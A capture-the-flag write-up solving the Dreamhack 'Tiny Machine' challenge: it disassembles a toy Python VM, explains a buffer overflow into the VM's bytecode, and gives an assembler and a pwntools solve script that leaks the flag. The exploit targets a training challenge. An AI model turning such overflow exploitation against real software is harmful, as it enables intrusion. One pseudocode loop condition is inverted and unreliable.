---
title: Tiny Machine
date: 2025-12-06 22:00:00 +0000
categories: [CTF, Dreamhack]
tags: [pwnable]
math: true
mermaid: true
media_subpath: /assets/posts/2025-12-07-Tiny-Machine
image:
  path: preview.png
---

## Dreamhack - Tiny Machine

### Overview

The **Tiny Machine** challenge implements a simple 8-bit register-based virtual machine written in Python. The VM loads the flag into memory, allocates space for our input right after it, and finally places the VM bytecode at the end meaning all data are laid out contiguously in memory.

The vulnerability comes from how the VM handles input, there's a buffer overflow during the read operation, allowing user-controlled bytes to overwrite adjacent memory, including parts of the VM program itself. Any invalid opcode or runtime exception causes the VM to exit. 

The VM intended functionality is to read our input and print it out back, but we will leverage the vulnerability to leak the flag directly from memory.

### Program Analysis

We are given just a single python file called *tiny_machine.py*

Here's the content of the code:

```python
import sys

class TinyMachine():
    def __init__(self, memory):
        self.memory = memory
        self.ip = 0
        self.registers = [0, 0, 0, 0]
        self.halted = False

    def setIp(self, ip):
        self.ip = ip

    def run(self):
        if self.halted:
            return

        while True:
            try:
                opcode = self.memory[self.ip]

                if opcode in [0, 1, 2, 3, 4, 5]:
                    dest = self.memory[self.ip + 1]
                    src = self.memory[self.ip + 2]                

                if opcode == 0: #LOAD
                    self.registers[dest] = self.memory[self.registers[src]]
                    self.ip += 3
                elif opcode == 1: #STORE
                    self.memory[self.registers[dest]] = self.registers[src]
                    self.ip += 3
                elif opcode == 2: #MOV_R_IMM
                    self.registers[dest] = src
                    self.ip += 3
                elif opcode == 3: #MOV_R_R
                    self.registers[dest] = self.registers[src]
                    self.ip += 3
                elif opcode == 4: #ADD_R_R
                    self.registers[dest] = (self.registers[dest] + self.registers[src]) & 0xFF
                    self.ip += 3
                elif opcode == 5: #ADD_R_IMM
                    self.registers[dest] = (self.registers[dest] + src) & 0xFF
                    self.ip += 3
                elif opcode == 6: #JNZ
                    if self.registers[1] != 0:
                        dest = self.memory[self.ip + 1]
                        self.ip = (self.ip + dest) & 0xFF
                    else:
                        self.ip += 2
                elif opcode == 7: #JMP
                    dest = self.memory[self.ip + 1]
                    self.ip = (self.ip + dest) & 0xFF
                elif opcode == 8: #EXT
                    if self.registers[0] == 0:
                        self.registers[1] = sys.stdin.buffer.read(1)[0]
                    elif self.registers[0] == 1:
                        sys.stdout.write(chr(self.registers[1]))
                        sys.stdout.flush()
                    self.ip += 1
                else:
                    self.halted = True
                    return
            except Exception as e:
                halted = True
                return

FLAG = b'DH{xxxxxxxxxxxxxxxxxxxxxxxxx}'

memory = list(FLAG + b'\xFF' * 192 + b'\x02\x02\x1d\x07\x02\x08\x01\x02\x01\x05\x02\x01\x05\x01\xf6\x06\xf4\x02\x00\x01\x02\x02\x1d\x00\x01\x02\x08\x05\x02\x01\x05\x01\xf6\x06\xf6')
machine = TinyMachine(memory)
machine.ip = 221
machine.run()
```

Looking through the code we see some handy comments for each switch cases in the **run** method of the **TinyMachine** class, and that gives us an idea of what each opcode does.

The important thing here is to first determine the instruction set the VM provides.

- Registers: The VM exposes 4 general-purpose 8-bit registers (r0, r1, r2, r3).
- Instruction Set: There are 9 opcodes (0–8) corresponding to:
    - Data movement:
        - **LOAD** - loads data from memory into a register
        - **STORE** - stores a register’s value into memory
        - **MOV_R_IMM** - moves an immediate value into a register
        - **MOV_R_R** - moves data between two registers
    - Arithmetic:
        - **ADD_R_R** - adds two registers
        - **ADD_R_IMM** - adds an immediate value to a register
    - Branching:
        - **JNZ** - jumps relative if a specific register (r1) is non-zero
        - **JMP** - jumps relative to the instruction pointer
    - System IO:
        - **EXT** - performs read/write operations via the VM
- Memory Size: 256 bytes


After running the challenge, the program initializes the VM’s memory layout.
- The FLAG is stored at the beginning of memory.
- An input buffer, where our provided bytes will later be read (starts at offset 29).
- The VM bytecode.

Once the memory is fully built, the program instantiates an object of the **TinyMachine** class (note that the registers are all zero).

The VM then initializes its instruction pointer to **221**, which is the starting offset of the bytecode inside the memory.

Finally, the VM enters its execution loop by calling the **run** method.

The **run** method basically processes the bytecode stored in the VM’s memory. It follows the instruction cycle: (fetch - decode - execute).


### Reversing

First let us execute the program.

```bash
 ~/Desktop/Lab/DreamHack/Pwn/Tiny-Machine ❯ python3 tiny_machine.py 
asdf
asdf

~/Desktop/Lab/DreamHack/Pwn/Tiny-Machine ❯ python3 tiny_machine.py
haha
haha

~/Desktop/Lab/DreamHack/Pwn/Tiny-Machine ❯ python3 tiny_machine.py
who am i
who am i

~/Desktop/Lab/DreamHack/Pwn/Tiny-Machine ❯ python3 tiny_machine.py
wutt
wutt
                                      
```

So basically it receives our input then prints it back..

Now we understand the instruction set, the next thing is to understand what the bytecode exactly does.

In order to achieve this, I wrote a disassembler.

```python
    def disasm(self, memory, start=0, end=None):
        if end is None:
            end = len(memory)

        ip = start
        while ip < end:
            opcode = memory[ip]
            mnem = self.OPCODES.get(opcode, f"UNK({opcode})")

            if opcode in (0,1,2,3,4,5):
                dest = memory[ip+1]
                src  = memory[ip+2]

                if opcode == 0:
                    op_str = f"{mnem} r{dest}, mem[r{src}]"
                elif opcode == 1:
                    op_str = f"{mnem} mem[r{dest}], r{src}"
                elif opcode == 2:
                    op_str = f"{mnem} r{dest}, #{src}"
                elif opcode == 5:
                    op_str = f"{mnem} r{dest}, #{src}"
                else:
                    op_str = f"{mnem} r{dest}, r{src}"

                print(f"0x{ip:03X}: {op_str}")
                ip += 3

            elif opcode == 6: 
                offset = memory[ip+1]
                print(f"0x{ip:03X}: {mnem} 0x{(ip+offset)&0xff:03X}")
                ip += 2

            elif opcode == 7: 
                offset = memory[ip+1]
                print(f"0x{ip:03X}: {mnem} 0x{(ip+offset)&0xff:03x}")
                ip += 2

            elif opcode == 8:
                print(f"0x{ip:03X}: EXT")
                ip += 1

            else:
                print(f"0x{ip:03X}: UNKNOWN({opcode})")
                ip += 1

```

And we can disassemble the bytecode with this:

```python
from tinyvm import *

FLAG = b'DH{xxxxxxxxxxxxxxxxxxxxxxxxx}'
memory = list(FLAG + b'\xFF' * 192 + b'\x02\x02\x1d\x07\x02\x08\x01\x02\x01\x05\x02\x01\x05\x01\xf6\x06\xf4\x02\x00\x01\x02\x02\x1d\x00\x01\x02\x08\x05\x02\x01\x05\x01\xf6\x06\xf6')

vm = TinyMachine()
vm.disasm(memory, 221)

```

Running that we get this:

```
~/Desktop/Lab/DreamHack/Pwn/Tiny-Machine ❯ python3 disasm.py
0x0DD: MOV_R_IMM r2, #29
0x0E0: JMP 0x0e2
0x0E2: EXT
0x0E3: STORE mem[r2], r1
0x0E6: ADD_R_IMM r2, #1
0x0E9: ADD_R_IMM r1, #246
0x0EC: JNZ 0x0E0
0x0EE: MOV_R_IMM r0, #1
0x0F1: MOV_R_IMM r2, #29
0x0F4: LOAD r1, mem[r2]
0x0F7: EXT
0x0F8: ADD_R_IMM r2, #1
0x0FB: ADD_R_IMM r1, #246
0x0FE: JNZ 0x0F4

```

So, the code isn't so much as expected, I'll go through what it does

- First it moves *29* into *r2*, then it jumps to *0xe2*
- The next instruction does a system IO call, when this happens, *r0* is used to determine what operation (read/write) we want to perform (so it's like the syscall register in standard cpu's).
- In this case, *r0* is zero because the registers are all null on instantiation.
- It reads in one byte and stores the result in *r1*
- The register *r1* is then moved into *mem + r2*, so *r2* here is used as an index into the vm memory of our input.
- It then increments the index *r2* by 1.
- And adds *r1* which is our input byte with *246* and if the result isn't *0* it jumps back to *0xe2*

From this point we understand that this portion of code will keep reading in our input until we meet the condition that breaks out of the loop.

The condition simply put as math is this:

```python
(byte + 246) % 256 = 0 # (byte == our input)
byte = (0 - 246) % 256
byte = 10
```

In order words, this keeps reading until it sees a new line. The C code like representation is this:

```c
struct vm_t {
    char flag[29];
    char buffer[192];
    char bytecode[35];
}

struct vm_t *mem;
uint8_t index = 29;

while (true) {
    uint8_t byte = getchar();
    if (byte != 0xa) break;
    mem->buffer[index] = byte;
    index++;
}
```

Moving on, when it sees a new line, the loop breaks then it does this:
- It moves *1* into *r0* and *29* into *r2*.
- Then it fetches the byte stored at the vm memory relative to *r2* and puts it in *r1*.
- A syscall IO instruction is then called, in this case *r0* is *1* which refers to *write* operation.
- So the value at *r1* is then printed to *stdout*.
- The index *r2* is incremented by *1*, and it does the same trick that reads until it hits a new line but in this case *writes*!.

Yet again, not much... here's the C like representation:

```c
uint8_t index = 29;

while (true) {
    uint8_t byte = mem->buffer[index];
    if (byte == 10) break;
    putchar(byte);
    index++;
}
```

### Exploitation

#### So, what's the vulnerability?

Well it's really obvious, there's a buffer overflow due to how it handles the *read* operation.

Rather than limiting the number of bytes to read into the buffer based on the exact size of the vm input buffer it rather uses our input to determine when to stop.

#### What can we leverage with this?

Since the data (flag, input, vm bytecode) are all contiguous in memory we can leverage this overflow to overwrite the vm bytecode thus having control flow over the vm.

```bash
[ FLAG ][ USER INPUT BUFFER ][ VM BYTECODE ]
```

#### What to overwrite? 

We know that the flag is already in memory, so we simply just need a way to print it out.

This is the approach I made use of.

Since we know the index starts from *29*, overwriting this to *0* would start printing from index *0* relative to *mem* thus leaking the flag.

```c
0x0F1: MOV_R_IMM r2, #29
```

There's a bit of problem with this approach though.

The problem is, the *write* operation will keep printing till it hits a new line.

But here, after we reach the end of the vm bytecode, the first byte of the FLAG is going to be overwritten with a new line character since there will be a wrap up (8 bit).

This simply is going to prevent us from printing the flag, because now that the first character is a new line the *write* operation stops in its first loop.

In order to go around this, I needed to bypass this check which is this:

```c
0x0FB: ADD_R_IMM r1, #246
0x0FE: JNZ 0x0F4
```

Here the operation is this:

```python
(byte + 246) % 256 == 0
byte = 10
```

We just need another value that would end up being 0 and not having to be a 10, in my case I use 0xff

```python
(byte + 1) % 256 == 0
byte = 0xff
```

Now i just simply need to start my input with 0xff, and the vm would print till it hits it.

I made an assembler to aid me with this, here's the full code:

```python
# tinyvm.py

class TinyMachine():
    def __init__(self):
        self.OPCODES = {
            0: "LOAD",
            1: "STORE",
            2: "MOV_R_IMM",
            3: "MOV_R_R",
            4: "ADD_R_R",
            5: "ADD_R_IMM",
            6: "JNZ",
            7: "JMP",
            8: "EXT",
        }

        self.MNEMONICS = {v: k for k, v in self.OPCODES.items()}


    def assemble(self, text):
            if isinstance(text, bytes):
                text = text.decode()
            
            machine = bytearray()

            for line in text.splitlines():
                line = line.strip()
                if not line or line.startswith(";"):
                    continue

                parts = line.replace(",", " ").split()
                mnemonic = parts[0].upper()

                if mnemonic not in self.MNEMONICS:
                    raise ValueError(f"Unknown instruction '{mnemonic}'")

                opcode = self.MNEMONICS[mnemonic]

                if opcode == 8:
                    machine.append(opcode)
                    continue

                if opcode in (6, 7):
                    if len(parts) != 2:
                        raise ValueError(f"{mnemonic} requires 1 operand")

                    offset = int(parts[1], 0) & 0xFF
                    machine.append(opcode)
                    machine.append(offset)
                    continue

                if opcode in (0,1,2,3,4,5):
                    if len(parts) != 3:
                        raise ValueError(f"{mnemonic} requires 2 operands")

                    dest = int(parts[1].lstrip("r"), 0) & 0xFF

                    src_str = parts[2]

                    if src_str.startswith("r"):
                        src = int(src_str[1:], 0) & 0xFF
                    elif src_str.startswith("#"):
                        src = int(src_str[1:], 0) & 0xFF
                    else:
                        raise ValueError(f"Invalid operand '{src_str}'")

                    machine.append(opcode)
                    machine.append(dest)
                    machine.append(src)
                    continue

                raise ValueError(f"Unhandled opcode {opcode}")

            return bytes(machine)


    def disasm(self, memory, start=0, end=None):
        if end is None:
            end = len(memory)

        ip = start
        while ip < end:
            opcode = memory[ip]
            mnem = self.OPCODES.get(opcode, f"UNK({opcode})")

            if opcode in (0,1,2,3,4,5):
                dest = memory[ip+1]
                src  = memory[ip+2]

                if opcode == 0:
                    op_str = f"{mnem} r{dest}, mem[r{src}]"
                elif opcode == 1:
                    op_str = f"{mnem} mem[r{dest}], r{src}"
                elif opcode == 2:
                    op_str = f"{mnem} r{dest}, #{src}"
                elif opcode == 5:
                    op_str = f"{mnem} r{dest}, #{src}"
                else:
                    op_str = f"{mnem} r{dest}, r{src}"

                print(f"0x{ip:03X}: {op_str}")
                ip += 3

            elif opcode == 6: 
                offset = memory[ip+1]
                print(f"0x{ip:03X}: {mnem} 0x{(ip+offset) & 0xff:03X}")
                ip += 2

            elif opcode == 7: 
                offset = memory[ip+1]
                print(f"0x{ip:03X}: {mnem} 0x{(ip+offset)&0xff:03x}")
                ip += 2

            elif opcode == 8:
                print(f"0x{ip:03X}: EXT")
                ip += 1

            else:
                print(f"0x{ip:03X}: UNKNOWN({opcode})")
                ip += 1

```

And my solve script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from tinyvm import TinyMachine

context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process(["python3", "tiny_machine.py"] + argv, *a, **kw)
    

def solve():

    io = start()

    vm = TinyMachine()
    
    sc = """
        MOV_R_IMM r0, #1
        JMP 2
        EXT
        STORE r2, r1
        ADD_R_IMM r2, #1
        ADD_R_IMM r1, #246
        JNZ 244
        MOV_R_IMM r0, #1
        MOV_R_IMM r2, #0
        LOAD r1, r2
        EXT
        ADD_R_IMM r2, #1
        ADD_R_IMM r1, #1
        JNZ 246
    """

    sc = vm.assemble(sc)
    
    offset = 191
    payload = b"\xff" + cyclic(offset) + sc

    io.sendline(payload)

    io.interactive()


def main():
    
    solve()
    

if __name__ == '__main__':
    main()
```

Running it!!

```bash
~/Desktop/Lab/DreamHack/Pwn/Tiny-Machine ❯ python3 solve.py                                   
[+] Starting local process '/usr/bin/python3' argv=[b'python3', b'tiny_machine.py'] : pid 244757
[DEBUG] Sent 0xe4 bytes:
    00000000  ff 61 61 61  61 62 61 61  61 63 61 61  61 64 61 61  │·aaa│abaa│acaa│adaa│
    00000010  61 65 61 61  61 66 61 61  61 67 61 61  61 68 61 61  │aeaa│afaa│agaa│ahaa│
    00000020  61 69 61 61  61 6a 61 61  61 6b 61 61  61 6c 61 61  │aiaa│ajaa│akaa│alaa│
    00000030  61 6d 61 61  61 6e 61 61  61 6f 61 61  61 70 61 61  │amaa│anaa│aoaa│apaa│
    00000040  61 71 61 61  61 72 61 61  61 73 61 61  61 74 61 61  │aqaa│araa│asaa│ataa│
    00000050  61 75 61 61  61 76 61 61  61 77 61 61  61 78 61 61  │auaa│avaa│awaa│axaa│
    00000060  61 79 61 61  61 7a 61 61  62 62 61 61  62 63 61 61  │ayaa│azaa│bbaa│bcaa│
    00000070  62 64 61 61  62 65 61 61  62 66 61 61  62 67 61 61  │bdaa│beaa│bfaa│bgaa│
    00000080  62 68 61 61  62 69 61 61  62 6a 61 61  62 6b 61 61  │bhaa│biaa│bjaa│bkaa│
    00000090  62 6c 61 61  62 6d 61 61  62 6e 61 61  62 6f 61 61  │blaa│bmaa│bnaa│boaa│
    000000a0  62 70 61 61  62 71 61 61  62 72 61 61  62 73 61 61  │bpaa│bqaa│braa│bsaa│
    000000b0  62 74 61 61  62 75 61 61  62 76 61 61  62 77 61 61  │btaa│buaa│bvaa│bwaa│
    000000c0  02 00 01 07  02 08 01 02  01 05 02 01  05 01 f6 06  │····│····│····│····│
    000000d0  f4 02 00 01  02 02 00 00  01 02 08 05  02 01 05 01  │····│····│····│····│
    000000e0  01 06 f6 0a                                         │····│
    000000e4
[*] Switching to interactive mode
[DEBUG] Received 0x19 bytes:
    b'\n'
    b'H{xxxxxxxxxxxxxxxxxxxxxx'

H{xxxxxxxxxxxxxxxxxxxxxx[DEBUG] Received 0x6 bytes:
    00000000  78 78 78 7d  c3 bf                                  │xxx}│··│
    00000006
xxx}ÿ
[*] Got EOF while reading in interactive
```

And viola we get the flag :fingerguns: